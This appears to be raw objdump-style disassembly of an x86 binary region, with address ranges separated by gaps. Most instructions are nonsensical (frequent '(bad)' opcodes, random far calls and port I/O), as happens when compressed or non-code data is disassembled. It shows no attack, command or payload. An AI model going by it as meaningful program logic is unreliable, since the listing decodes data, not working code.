  414e6a:	ins    BYTE PTR es:[edi],dx
  414e6b:	ds dec ebp
  414e6d:	sbb    DWORD PTR [edi-0x72],ecx
  414e70:	push   0xd3b2e792
  414e75:	add    DWORD PTR [ebx-0x42f0b96e],esp
  414e7b:	leave  
  414e7c:	(bad)  
  414e7d:	stos   DWORD PTR es:[edi],eax
  414e7e:	rcr    DWORD PTR [ecx+0x17],0x47
  414e82:	scas   eax,DWORD PTR es:[edi]
  414e83:	call   0x60830800
  414e88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e89:	(bad)  
  414e8a:	retf   0xeb7f
  414e8d:	xor    DWORD PTR [ebp-0x22],ebx
  414e90:	cs and al,0x4f
  414e93:	hlt    
  414e94:	packssdw mm3,QWORD PTR [eax-0x17]
  414e98:	mov    BYTE PTR [edi-0xdc8ccfc],ah
  414e9e:	in     eax,dx
  414e9f:	mov    ch,0xd1
  414ea1:	imul   esp,DWORD PTR ds:0x11a2ba3c,0x62
  414ea8:	and    al,0x14
  414eaa:	pop    edx
  414eab:	inc    edi
  414eac:	pop    esi
  414ead:	dec    DWORD PTR [ebp-0x19346e8b]
  414eb3:	or     al,BYTE PTR [ebp-0x51]
  414eb6:	cmp    edx,edx
  414eb8:	stos   BYTE PTR es:[edi],al
  414eb9:	mov    WORD PTR [esi],?
  414ebb:	xor    bh,BYTE PTR ds:0xa5abadad
  414ec1:	cmp    dh,dl
  414ec3:	test   eax,0xf25b51d
  414ec8:	outs   dx,BYTE PTR ds:[esi]
  414ec9:	cmp    al,BYTE PTR [esi+edi*8]
  414ecc:	jo     0x414e88
  414ece:	repz jnp 0x414f4c
  414ed1:	js     0x414ef9
  414ed3:	mov    ds:0xb0e422f4,al
  414ed8:	push   0x58
  414eda:	in     al,0xd0
  414edc:	loope  0x414e74
  414ede:	mov    DWORD PTR [ecx],esi
  414ee0:	jge    0x414e90
  414ee2:	inc    esp
  414ee3:	mov    dl,0xf2
  414ee5:	test   bh,al
  414ee7:	cmp    dl,ch
  414ee9:	adc    edi,DWORD PTR [ebx-0x5a]
  414eec:	rcr    BYTE PTR [ecx-0x39],cl
  414eef:	mov    bl,dl
  414ef1:	js     0x414f1d
  414ef3:	les    ebx,FWORD PTR [esi+0x15de0330]
  414ef9:	in     al,dx
  414efa:	mov    ds:0x64782d17,al
  414eff:	inc    ebx
  414f00:	lea    edx,[eax]
  414f02:	sti    
  414f03:	or     al,cl
  414f05:	cmp    cl,BYTE PTR [esi+esi*2+0x38f6ca6e]
  414f0c:	in     eax,0x88
  414f0e:	inc    ecx
  414f0f:	inc    eax
	...
  414f74:	aaa    
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd08:0x19274f0a
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    al,0x1
  414f8a:	add    BYTE PTR [eax],al
  414f8c:	pop    ebp
  414f8d:	xor    dh,BYTE PTR [eax-0x733b4b5a]
  414f93:	ror    DWORD PTR ds:0xe97dec5b,1
  414f99:	inc    edi
  414f9a:	(bad)  
  414f9b:	ret    0xadc1
  414f9e:	sbb    eax,0x9bc25c0a
  414fa3:	xchg   ecx,eax
  414fa4:	fiadd  WORD PTR ds:0x2546d9d1
  414faa:	imul   esp,edi,0x9428e2ed
  414fb0:	pop    esi
  414fb1:	mov    ebp,0x5164df95
  414fb6:	or     edi,DWORD PTR [eax]
  414fb8:	mov    ecx,0xd44fe1e1
  414fbd:	push   ebx
  414fbe:	cmp    al,0x45
  414fc0:	cmp    ah,dh
  414fc2:	in     eax,dx
  414fc3:	enter  0x8c96,0x3
  414fc7:	mov    WORD PTR [ecx-0xd],cs
  414fca:	jl     0x414fe6
  414fcc:	add    esi,esp
  414fce:	mov    dh,0x4d
  414fd0:	inc    edi
  414fd1:	and    eax,0x4e7f6194
  414fd6:	fnstcw WORD PTR [edi+eax*4]
  414fd9:	sbb    DWORD PTR [edi+eax*1+0x3a625c62],esi
  414fe0:	pop    eax
  414fe1:	and    DWORD PTR [eax+0x3c7d8bca],edx
  414fe7:	outs   dx,DWORD PTR ds:[esi]
  414fe8:	push   0xfffffff7
  414fea:	inc    edi
  414feb:	xor    BYTE PTR [edi],ch
  414fed:	dec    ebx
  414fee:	cli    
  414fef:	fnsave ds:0x637e5a62
  414ff5:	(bad)  
  414ff6:	scas   al,BYTE PTR es:[edi]
  414ff7:	jo     0x414fb8
  414ff9:	dec    ebp
  414ffa:	cmp    eax,esi
  414ffc:	push   edi
  414ffd:	jmp    0x414fee
  414fff:	push   0x67
  415001:	scas   al,BYTE PTR es:[edi]
  415002:	cdq    
  415003:	scas   eax,DWORD PTR es:[edi]
  415004:	pop    esi
  415005:	mov    ebp,0xc9dbac11
  41500a:	sti    
  41500b:	ja     0x414fd8
  41500d:	(bad)
  415011:	sub    edx,DWORD PTR [esi+0x1139d29d]
  415017:	mov    ch,0xa2
  415019:	mov    ds:0x767ac796,al
  41501e:	aam    0x3b
  415020:	pop    ds
  415021:	pop    edi
  415022:	sbb    edi,DWORD PTR [eax]
  415024:	dec    edx
  415025:	xor    DWORD PTR [edx+eiz*2],ebp
  415028:	xor    ecx,DWORD PTR [eax-0x5cc24be5]
  41502e:	jg     0x414fe1
  415030:	stos   BYTE PTR es:[edi],al
  415031:	push   ebx
  415032:	dec    ebp
  415033:	loope  0x415027
  415035:	pusha  
  415036:	rol    DWORD PTR [edi],0xf2
  415039:	sub    edi,edi
  41503b:	or     ecx,DWORD PTR [ecx+edx*1]
  41503e:	mov    ss,ebx
  415040:	add    BYTE PTR [esi-0x3dda3630],dl
  415046:	popf   
  415047:	cmp    edx,DWORD PTR [ebx]
  415049:	cmp    eax,0x2caf71c1
  41504e:	repz pop ebx
  415050:	daa    
  415051:	leave  
  415052:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415053:	fwait
  415054:	rcr    DWORD PTR [ecx+0x73fd43d5],0x51
  41505b:	clc    
  41505c:	and    eax,0x3453d386
  415061:	aad    0x75
  415063:	cmp    esi,DWORD PTR [esi]
  415065:	xchg   ebx,edx
  415067:	fdiv   DWORD PTR [ecx+ecx*8+0xa5fc6fe]
  41506e:	jg     0x415017
  415070:	cwde   
  415071:	mov    ch,0x7a
  415073:	or     edx,DWORD PTR [edx+0x2b]
  415076:	mov    ch,0x2e
  415078:	arpl   WORD PTR [ecx],di
  41507a:	inc    ebx
  41507b:	jb     0x415017
  41507d:	push   ebx
  41507e:	adc    eax,0x3562be97
  415083:	(bad)  
  415084:	or     eax,0xc6512932
  415089:	pop    ds
  41508a:	cmp    al,0xab
  41508c:	or     esi,edx
  41508e:	jbe    0x4150cf
	...
  4150f4:	jnp    0x4150f8
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0x826bfc2d
  415102:	repz aad 0xc
  415105:	fiadd  WORD PTR [eax]
  415107:	add    BYTE PTR [ecx+eax*1],al
  41510a:	add    BYTE PTR [eax],al
  41510c:	mov    ecx,0xae7dcf40
  415111:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415112:	popf   
  415113:	add    eax,0xdd3fe4ce
  415118:	sub    edx,DWORD PTR [edi-0x39c82b3f]
  41511e:	in     eax,dx
  41511f:	adc    eax,0x8e6e64f0
  415124:	outs   dx,BYTE PTR cs:[esi]
  415126:	ds xchg edi,eax
  415128:	push   ebx
  415129:	scas   eax,DWORD PTR es:[edi]
  41512a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41512b:	sub    ebp,DWORD PTR [esi+ecx*8-0x4e]
  41512f:	loopne 0x415163
  415131:	arpl   cx,di
  415133:	popa   
  415134:	fucomip st,st(1)
  415136:	and    ebx,0xffffffe4
  415139:	scas   eax,DWORD PTR es:[edi]
  41513a:	push   0x98eb0bde
  41513f:	sar    DWORD PTR [ecx-0x6],cl
  415142:	lock pop ecx
  415144:	jo     0x4151b3
  415146:	dec    edi
  415147:	sbb    eax,0xbf629960
  41514c:	add    edi,DWORD PTR [edi+0x4f]
  41514f:	and    ebx,DWORD PTR [eax]
  415151:	adc    dl,BYTE PTR [edx+0x33b585f7]
  415157:	pop    edx
  415158:	pop    ecx
  415159:	sbb    BYTE PTR [edx-0x5c],ah
  41515c:	jmp    0x4151cb
  41515e:	xchg   BYTE PTR [edi-0x2e8ca62d],al
  415164:	xchg   ecx,eax
  415165:	mov    al,0xb1
  415167:	std    
  415168:	fadd   st,st(1)
  41516a:	sub    DWORD PTR ss:[eax+0x3e],ecx
  41516e:	dec    esi
  41516f:	stc    
  415170:	inc    ebx
  415171:	cmc    
  415172:	cmp    DWORD PTR [esi+0x7e],edx
  415175:	adc    eax,0x8dbf17b2
  41517a:	or     al,ch
  41517c:	xchg   ebx,eax
  41517d:	aad    0x78
  41517f:	mul    DWORD PTR [ecx-0x3edecc46]
  415185:	lods   al,BYTE PTR ds:[esi]
  415186:	das    
  415187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415188:	into   
  415189:	mov    ds:0x3cb70750,al
  41518e:	gs jmp 0x4151c7
  415191:	fs (bad) 
  415193:	outs   dx,DWORD PTR ds:[esi]
  415194:	aad    0xce
  415196:	iret   
  415197:	xchg   edx,eax
  415198:	fsub   DWORD PTR [esi]
  41519a:	rol    DWORD PTR ds:0x26282681,0xa3
  4151a1:	fwait
  4151a2:	pop    edx
  4151a3:	cdq    
  4151a4:	sbb    al,bl
  4151a6:	jp     0x4151af
  4151a8:	mov    ebp,0x461d009e
  4151ad:	push   edx
  4151ae:	shl    DWORD PTR [ebx-0x4f],cl
  4151b1:	pop    ds
  4151b2:	mov    ds:0x9f3bd232,eax
  4151b7:	fs sub eax,0x9c75673
  4151bd:	xchg   ecx,eax
  4151be:	scas   al,BYTE PTR es:[edi]
  4151bf:	int    0x20
  4151c1:	xor    al,0x2c
  4151c3:	sbb    DWORD PTR ds:[edi-0x4b5d69b],esi
  4151ca:	retf   
  4151cb:	jp     0x41523c
  4151cd:	arpl   WORD PTR [edx+0x396360be],cx
  4151d3:	pop    esp
  4151d4:	push   esi
  4151d5:	or     BYTE PTR [eax+eax*2+0x59e0d289],0x40
  4151dd:	pop    ds
  4151de:	fwait
  4151df:	call   0x2198:0xb4f98187
  4151e6:	mov    fs,WORD PTR [edi]
  4151e8:	dec    esi
  4151e9:	mov    eax,0xf2e6a84a
  4151ee:	jl     0x4151fd
  4151f0:	outs   dx,BYTE PTR ds:[esi]
  4151f1:	pop    ds
  4151f2:	out    dx,al
  4151f3:	and    DWORD PTR [edx+ecx*2],esp
  4151f6:	mov    esi,edi
  4151f8:	push   esi
  4151f9:	scas   eax,DWORD PTR es:[edi]
  4151fa:	jno    0x415195
  4151fc:	xor    bl,BYTE PTR ds:[ecx+0x781099f8]
  415203:	repz jge 0x41525f
  415206:	lock mov ch,0x1a
  415209:	jge    0x41525f
  41520b:	or     bh,BYTE PTR [ebx+0x9a8f67]
	...
  415271:	add    BYTE PTR [eax],al
  415273:	add    BYTE PTR [edi+edx*4],ch
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0xd245400b
  415283:	pop    esp
  415284:	adc    bh,bl
  415286:	add    BYTE PTR [eax],al
  415288:	add    al,0x1
  41528a:	add    BYTE PTR [eax],al
  41528c:	stos   BYTE PTR es:[edi],al
  41528d:	shl    BYTE PTR [esi+0x28],0xb5
  415291:	sbb    DWORD PTR [eax+0x5d],0xffffffbe
  415295:	iret   
  415296:	sar    BYTE PTR [edi+0x39],0xf5
  41529a:	lods   eax,DWORD PTR ds:[esi]
  41529b:	inc    ecx
  41529c:	dec    ebp
  41529d:	loope  0x4152c5
  41529f:	das    
  4152a0:	loopne 0x4152a3
  4152a2:	lahf   
  4152a3:	xchg   edx,eax
  4152a4:	xor    ebx,DWORD PTR [eax-0x2e1918ba]
  4152aa:	mov    al,ds:0x76869e17
  4152af:	mov    ebx,0x82584c90
  4152b4:	sar    DWORD PTR [esi+0x56],cl
  4152b7:	mov    dl,0xdc
  4152b9:	sbb    eax,0xbc5a448b
  4152be:	add    DWORD PTR [eax-0x76],esi
  4152c1:	xor    al,0xbd
  4152c3:	xor    eax,0xa1c7631c
  4152c8:	jae    0x415338
  4152ca:	sahf   
  4152cb:	mov    dl,0xfe
  4152cd:	dec    esp
  4152ce:	mov    ch,ch
  4152d0:	jle    0x415284
  4152d2:	dec    edx
  4152d3:	stos   BYTE PTR es:[edi],al
  4152d4:	arpl   WORD PTR [eax],di
  4152d6:	add    al,0x10
  4152d8:	gs out 0x98,al
  4152db:	adc    al,0x64
  4152dd:	lods   eax,DWORD PTR ds:[esi]
  4152de:	inc    eax
  4152df:	and    eax,0x3c4b6e1a
  4152e4:	enter  0xce50,0x51
  4152e8:	or     eax,0xb933b325
  4152ed:	sbb    eax,0x228f9e43
  4152f2:	and    eax,0x5d0cc601
  4152f7:	mov    bh,0xb6
  4152f9:	mov    esi,0x3f33a4db
  4152fe:	ins    DWORD PTR es:[edi],dx
  4152ff:	call   0xe0b5:0x93603ab2
  415306:	push   esi
  415307:	arpl   WORD PTR [ecx-0x11],bx
  41530a:	or     ch,BYTE PTR [edx-0x3db195e2]
  415310:	sbb    eax,0x2edcc492
  415315:	sti    
  415316:	call   0x40b1:0x68b5fa1b
  41531d:	or     eax,edi
  41531f:	sub    al,0xbf
  415321:	lock and eax,0x436d1039
  415327:	jnp    0x415349
  415329:	mov    bh,0x25
  41532b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41532d:	or     ebp,DWORD PTR [eax]
  41532f:	sub    al,0x7a
  415331:	out    0x5a,al
  415333:	outs   dx,BYTE PTR ds:[esi]
  415334:	xchg   esi,eax
  415335:	add    DWORD PTR [ebx+0xe6768c4],eax
  41533b:	test   BYTE PTR [esi+0x5edfc9e9],bl
  415341:	add    DWORD PTR [ebp-0x535e6a77],ebp
  415347:	cmc    
  415348:	retf   
  415349:	mov    ebp,0x8a4802e1
  41534e:	jecxz  0x415337
  415350:	pop    edi
  415351:	je     0x415359
  415353:	mov    cl,0xb0
  415355:	in     al,dx
  415356:	or     ebx,DWORD PTR [ebx]
  415358:	sahf   
  415359:	jl     0x4153bc
  41535b:	jbe    0x4152df
  41535d:	xchg   ah,dh
  41535f:	inc    esi
  415360:	scas   al,BYTE PTR es:[edi]
  415361:	scas   eax,DWORD PTR es:[edi]
  415362:	into   
  415363:	iret   
  415364:	push   0x6c37cae7
  415369:	or     al,0xa6
  41536b:	fist   WORD PTR [eax+0x71027689]
  415371:	fist   DWORD PTR [edx+0x1dbfa9f1]
  415377:	(bad)  
  415378:	ror    BYTE PTR [edx],1
  41537a:	adc    esp,DWORD PTR [ebx]
  41537c:	aam    0x6f
  41537e:	and    edx,DWORD PTR [eax+0x64]
  415381:	add    edx,DWORD PTR [ebp-0x47]
  415384:	and    BYTE PTR [ebx+0x67],cl
  415387:	movntps XMMWORD PTR [ecx],xmm0
  41538a:	push   eax
  41538b:	jge    0x415316
  41538d:	out    dx,eax
  41538e:	in     eax,dx
  41538f:	jae    0x415391
	...
  4153f1:	add    BYTE PTR [eax],al
  4153f3:	add    BYTE PTR [ebp-0x10],ch
  4153f6:	repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0xbad3e5b0
  415401:	fimul  WORD PTR [eax+0x14]
  415404:	adc    al,0xe0
  415406:	add    BYTE PTR [eax],al
  415408:	add    al,0x1
  41540a:	add    BYTE PTR [eax],al
  41540c:	push   ds
  41540d:	xchg   esi,eax
  41540e:	aam    0xa1
  415410:	(bad)  [edx+edx*2+0x25]
  415414:	jbe    0x4153bc
  415416:	(bad)  
  415417:	mov    cl,0x1c
  415419:	mov    BYTE PTR [ecx+0xa],cl
  41541c:	or     esp,DWORD PTR [edx-0x6d]
  41541f:	stos   DWORD PTR es:[edi],eax
  415420:	lock ret 0x14c5
  415424:	ins    DWORD PTR es:[edi],dx
  415425:	es ins BYTE PTR es:[edi],dx
  415427:	test   DWORD PTR [ecx+0x4cddc01d],esp
  41542d:	test   eax,0xb75e448d
  415432:	pop    ss
  415433:	xor    DWORD PTR [ebx],ebp
  415435:	jle    0x415414
  415437:	inc    ecx
  415438:	hlt    
  415439:	outs   dx,BYTE PTR ds:[esi]
  41543a:	mov    esp,0xe56a1cf7
  41543f:	mov    DWORD PTR [edi+0x27],eax
  415442:	push   0x8b5f1e6d
  415447:	imul   DWORD PTR [ecx-0x36]
  41544a:	mov    edx,0xd4912bf3
  41544f:	loopne 0x415418
  415451:	and    BYTE PTR [ebp+0x11ebec47],ah
  415457:	inc    eax
  415458:	(bad)  
  415459:	mov    BYTE PTR [edx],bh
  41545b:	aam    0x30
  41545d:	or     dh,BYTE PTR [edx+0xd98dd95]
  415463:	fld    TBYTE PTR [esi+0x5df66246]
  415469:	mov    edi,ebp
  41546b:	xchg   DWORD PTR [esi+ebx*4-0x3d],edx
  41546f:	lock sbb ebp,DWORD PTR [edi+0x5f]
  415473:	jl     0x4154a2
  415475:	lea    ebx,[edx+eiz*2-0x2e]
  415479:	xchg   edi,eax
  41547a:	hlt    
  41547b:	mov    ebp,0x16cb332d
  415480:	into   
  415481:	mov    edi,0x8c99f746
  415486:	(bad)  
  415487:	sub    BYTE PTR gs:[ebx-0x6694780d],bh
  41548e:	pushf  
  41548f:	mov    edx,0x6b704983
  415494:	fidivr DWORD PTR [eax-0x5c0826bc]
  41549a:	outs   dx,BYTE PTR ds:[esi]
  41549b:	dec    ecx
  41549c:	sub    ebp,DWORD PTR [esi+eiz*4-0x1007da11]
  4154a3:	repnz sahf 
  4154a5:	pusha  
  4154a6:	das    
  4154a7:	out    0xdb,al
  4154a9:	stc    
  4154aa:	(bad)  
  4154ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154ac:	and    al,0x7e
  4154ae:	xor    ch,BYTE PTR [eax]
  4154b0:	retf   0xdf75
  4154b3:	xlat   BYTE PTR ds:[ebx]
  4154b4:	mov    BYTE PTR [ebp-0x49],cl
  4154b7:	fnstenv [edi+0x1f86d374]
  4154bd:	mov    eax,ds:0x519fa513
  4154c2:	or     al,0x72
  4154c4:	dec    esp
  4154c5:	push   cs
  4154c6:	inc    ecx
  4154c7:	jns    0x415537
  4154c9:	xor    esp,eax
  4154cb:	ja     0x41547e
  4154cd:	jg     0x415507
  4154cf:	lds    eax,FWORD PTR [ebp-0x39]
  4154d2:	outs   dx,BYTE PTR ds:[esi]
  4154d3:	sub    cl,ch
  4154d5:	pop    esi
  4154d6:	fiadd  DWORD PTR [ebx+edx*2+0x7c]
  4154da:	daa    
  4154db:	push   eax
  4154dc:	int    0x95
  4154de:	pop    ebx
  4154df:	mov    ebp,0x6b89b89
  4154e4:	jns    0x415481
  4154e6:	dec    edx
  4154e7:	in     eax,0xa
  4154e9:	(bad)  
  4154ea:	iret   
  4154eb:	push   eax
  4154ec:	gs fwait
  4154ee:	inc    esp
  4154ef:	mov    al,0xbc
  4154f1:	jge    0x4154e2
  4154f3:	adc    BYTE PTR [ebx],ch
  4154f5:	nop
  4154f6:	mov    esi,DWORD PTR [edx+0xed28c2]
  4154fc:	xchg   esi,eax
  4154fd:	in     al,dx
  4154fe:	and    dl,BYTE PTR [esi+0xb]
  415501:	(bad)  
  415503:	stos   DWORD PTR es:[edi],eax
  415504:	or     bl,BYTE PTR ds:0x79f1398f
  41550a:	fild   WORD PTR [ebx]
  41550c:	push   ecx
  41550d:	sbb    al,0x23
  41550f:	cmp    BYTE PTR [eax],al
	...
  415571:	add    BYTE PTR [eax],al
  415573:	add    ah,ah
  415575:	lock sub DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x4155b5
  415581:	test   eax,0xe1182b7e
  415586:	add    BYTE PTR [eax],al
  415588:	add    al,0x1
  41558a:	add    BYTE PTR [eax],al
  41558c:	outs   dx,DWORD PTR ds:[esi]
  41558d:	and    eax,0xe6aea952
  415592:	(bad)  
  415594:	jbe    0x415533
  415596:	or     eax,0xffffffc3
  415599:	pop    edx
  41559a:	push   esi
  41559b:	sub    al,0x17
  41559d:	and    eax,0x5589ccaf
  4155a2:	mov    dl,0x3b
  4155a4:	shr    edx,cl
  4155a6:	pop    ds
  4155a7:	xor    edi,DWORD PTR [ecx+0x68e17c2d]
  4155ad:	aaa    
  4155ae:	lock test BYTE PTR [ebx],cl
  4155b1:	jo     0x41555c
  4155b3:	and    al,0x2f
  4155b5:	lds    edi,FWORD PTR [edi+ebp*1]
  4155b8:	leave  
  4155b9:	xlat   BYTE PTR ds:[ebx]
  4155ba:	xchg   esp,eax
  4155bb:	mov    esi,0x399ea693
  4155c0:	js     0x4155c2
  4155c2:	xor    eax,0x179608ed
  4155c7:	in     al,0x2f
  4155c9:	jp     0x415616
  4155cb:	sbb    ebp,DWORD PTR [esi]
  4155cd:	xor    BYTE PTR [ebx],ch
  4155cf:	xchg   ecx,eax
  4155d0:	rcl    DWORD PTR [ebx-0xc35c6dc],0x44
  4155d7:	adc    cl,BYTE PTR [ecx-0x17]
  4155da:	cld    
  4155db:	mov    cl,0x4f
  4155dd:	adc    ecx,eax
  4155df:	dec    eax
  4155e0:	mov    dl,0x3f
  4155e2:	cs jno 0x4155bc
  4155e5:	imul   eax,DWORD PTR [ebp+0x16],0xe5824bea
  4155ec:	cli    
  4155ed:	ds mov dh,0x37
  4155f0:	scas   eax,DWORD PTR es:[edi]
  4155f1:	mov    dl,0x41
  4155f3:	add    BYTE PTR ds:0x601eb6ed,bl
  4155f9:	or     al,0xd4
  4155fb:	add    DWORD PTR [esi],ebx
  4155fd:	(bad)  
  4155ff:	or     ah,BYTE PTR [ebp+0x7895621f]
  415605:	rcr    BYTE PTR [esi],cl
  415607:	xor    ch,BYTE PTR [ecx]
  415609:	div    bl
  41560b:	out    dx,al
  41560c:	jg     0x4155a2
  41560e:	stos   BYTE PTR es:[edi],al
  41560f:	mov    dh,0x5e
  415611:	test   eax,0xeee91e54
  415616:	outs   dx,BYTE PTR ds:[esi]
  415617:	pop    es
  415618:	pop    ecx
  415619:	add    DWORD PTR [ebx],eax
  41561b:	adc    BYTE PTR [ebp+0x300eaa74],bh
  415621:	jmp    0x41560c
  415623:	daa    
  415624:	and    BYTE PTR [edi-0x1d],dl
  415627:	retf   0x5944
  41562a:	scas   eax,DWORD PTR es:[edi]
  41562b:	icebp  
  41562c:	xchg   ecx,eax
  41562d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41562e:	push   ebx
  41562f:	xchg   ecx,eax
  415630:	jno    0x415688
  415632:	test   eax,0x7f8e750
  415637:	in     al,dx
  415638:	pop    esi
  415639:	pop    ecx
  41563a:	bound  esi,QWORD PTR ds:0x83256fe9
  415640:	inc    edx
  415641:	xchg   DWORD PTR [esi],edx
  415643:	rcl    ch,cl
  415645:	stos   BYTE PTR es:[edi],al
  415646:	jecxz  0x4156b3
  415648:	add    al,0x5
  41564a:	sub    BYTE PTR [ebx+0x57],bl
  41564d:	push   ebx
  41564e:	jmp    0x415689
  415650:	fwait
  415651:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415652:	rcr    DWORD PTR [eax-0x4ec33e75],0x93
  415659:	mov    al,BYTE PTR [edi-0x5aa33d14]
  41565f:	mov    DWORD PTR [edi],esp
  415661:	dec    eax
  415662:	iret   
  415663:	(bad)  
  415664:	fimul  DWORD PTR [esi+0x499f8030]
  41566a:	sbb    DWORD PTR [ecx-0x44],0x20
  41566e:	push   0x6cb13696
  415673:	pop    eax
  415674:	push   esp
  415675:	sub    eax,0x22893005
  41567a:	rcr    DWORD PTR [ecx+0x5e9a0cf1],1
  415680:	push   ss
  415681:	sbb    BYTE PTR [edx+0x5db6d9d5],ch
  415687:	test   eax,0x8bfaeab
  41568c:	xor    eax,0x11e015
	...
  4156f1:	add    BYTE PTR [eax],al
  4156f3:	add    BYTE PTR [ebp-0x66],ch
  4156f6:	mov    esp,0xfd67ff45
  4156fb:	mov    edx,0x2c46bab3
  415700:	jae    0x415704
  415702:	stc    
  415703:	push   ebp
  415704:	sbb    al,0xe2
  415706:	add    BYTE PTR [eax],al
  415708:	add    al,0x1
  41570a:	add    BYTE PTR [eax],al
  41570c:	sub    ebp,DWORD PTR [ecx+0x76e0a0e4]
  415712:	mov    dh,0xba
  415714:	int3   
  415715:	pushf  
  415716:	addr16 arpl ax,si
  415719:	frstor [ebx+0x1588f77f]
  41571f:	mov    es,WORD PTR [ecx+0x6d]
  415722:	mov    bl,0x38
  415724:	(bad)  
  415725:	int3   
  415726:	call   0x658193a5
  41572b:	or     ch,BYTE PTR [esi+0x7e89817b]
  415731:	mov    WORD PTR [ebp+edi*8-0x3],cs
  415735:	icebp  
  415736:	out    0xab,al
  415738:	dec    eax
  415739:	jno    0x415750
  41573b:	mov    ebx,0xebc328ee
  415740:	add    eax,0x3dac1e1f
  415745:	sub    al,bl
  415747:	jl     0x415792
  415749:	jne    0x41572e
  41574b:	and    eax,DWORD PTR [ecx]
  41574d:	enter  0xed9a,0xb7
  415751:	or     al,0x7b
  415753:	mov    ah,0xb9
  415755:	loope  0x415754
  415757:	repnz es or al,0x5b
  41575c:	inc    edi
  41575d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41575e:	inc    eax
  41575f:	(bad)  
  415760:	out    dx,al
  415761:	in     al,0x8b
  415763:	pop    esp
  415764:	mov    bl,0xcd
  415766:	mov    esi,0x4f96bf5e
  41576b:	jmp    0x415765
  41576d:	mov    WORD PTR [edi-0x4],gs
  415770:	mov    edx,0x82e2540f
  415775:	xchg   ecx,eax
  415776:	pop    ebx
  415777:	or     eax,0xca85914c
  41577c:	inc    esp
  41577d:	jg     0x415769
  41577f:	sub    al,0x47
  415781:	xlat   BYTE PTR ds:[ebx]
  415782:	std    
  415783:	pop    es
  415784:	ret    0xe993
  415787:	iret   
  415788:	adc    di,WORD PTR [esi-0x51]
  41578c:	sub    edi,DWORD PTR [edx-0x34e914b4]
  415792:	push   ss
  415793:	push   0x10d77adb
  415798:	out    0x26,eax
  41579a:	xchg   esp,eax
  41579b:	pop    ecx
  41579c:	ss pushf 
  41579e:	(bad)  
  41579f:	mov    al,0x19
  4157a1:	mov    bl,0x16
  4157a3:	adc    ch,0x87
  4157a6:	adc    bh,al
  4157a8:	mov    ecx,0xc43a3f68
  4157ad:	pop    eax
  4157ae:	sub    ebp,DWORD PTR [esi+0x210dd7dc]
  4157b4:	scas   al,BYTE PTR es:[edi]
  4157b5:	mov    edx,0xaeda1279
  4157ba:	fisub  WORD PTR [edi]
  4157bc:	or     al,0x9b
  4157be:	jno    0x4157a3
  4157c0:	jl     0x4157ec
  4157c2:	xor    eax,0x14dce1ae
  4157c7:	cwde   
  4157c8:	nop
  4157c9:	adc    ch,BYTE PTR ds:[esi+edx*1-0x7e]
  4157ce:	fstp   QWORD PTR [ebx-0x2d]
  4157d1:	jg     0x4157cd
  4157d3:	ins    DWORD PTR es:[edi],dx
  4157d4:	jl     0x415789
  4157d6:	and    al,0x89
  4157d8:	enter  0xd51e,0x33
  4157dc:	jg     0x415775
  4157de:	ds scas al,BYTE PTR es:[edi]
  4157e0:	js     0x415821
  4157e2:	or     al,0xb4
  4157e4:	pushf  
  4157e5:	push   cs
  4157e6:	outs   dx,BYTE PTR ds:[esi]
  4157e7:	push   DWORD PTR [esi+edi*8]
  4157ea:	push   edx
  4157eb:	jl     0x4157b1
  4157ed:	mov    ebp,0x9cc1a9fb
  4157f2:	mov    edi,0xd1fa859d
  4157f7:	repnz sub ah,BYTE PTR [edx-0x3e]
  4157fb:	inc    ebx
  4157fc:	pop    ds
  4157fd:	lods   eax,DWORD PTR ds:[esi]
  4157fe:	lods   eax,DWORD PTR ds:[esi]
  4157ff:	or     BYTE PTR [edi],ah
  415801:	inc    eax
  415802:	sbb    al,0x86
  415804:	sbb    al,0x34
  415806:	std    
  415807:	add    DWORD PTR [eax+0x2d],ebx
  41580a:	imul   ebx,DWORD PTR [ebx+0x6e],0x291ec7
	...
  415871:	add    BYTE PTR [eax],al
  415873:	add    bl,cl
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	rcl    DWORD PTR [ecx],cl
  415881:	dec    ebp
  415882:	and    al,0x30
  415884:	and    bl,ah
  415886:	add    BYTE PTR [eax],al
  415888:	add    al,0x1
  41588a:	add    BYTE PTR [eax],al
  41588c:	test   esi,0x50e07d72
  415892:	ins    BYTE PTR es:[edi],dx
  415893:	sub    eax,0x62a9ba5e
  415898:	sahf   
  415899:	adc    DWORD PTR [edi+eax*2],ebp
  41589c:	pop    es
  41589d:	jbe    0x4158ec
  41589f:	jae    0x4158f6
  4158a1:	gs in  eax,0x4a
  4158a4:	inc    esp
  4158a5:	mov    eax,ebx
  4158a7:	fisub  DWORD PTR [ecx-0x7894a9bd]
  4158ad:	push   ebp
  4158ae:	leave  
  4158af:	aaa    
  4158b0:	call   0xe636:0x979a5438
  4158b7:	jb     0x415862
  4158b9:	mov    eax,ds:0x162e1bf8
  4158be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158bf:	nop
  4158c0:	jbe    0x4158a9
  4158c2:	das    
  4158c3:	stos   BYTE PTR es:[edi],al
  4158c4:	mov    cl,0x49
  4158c6:	mov    eax,ds:0x4f5f1f02
  4158cb:	nop
  4158cc:	xchg   edx,eax
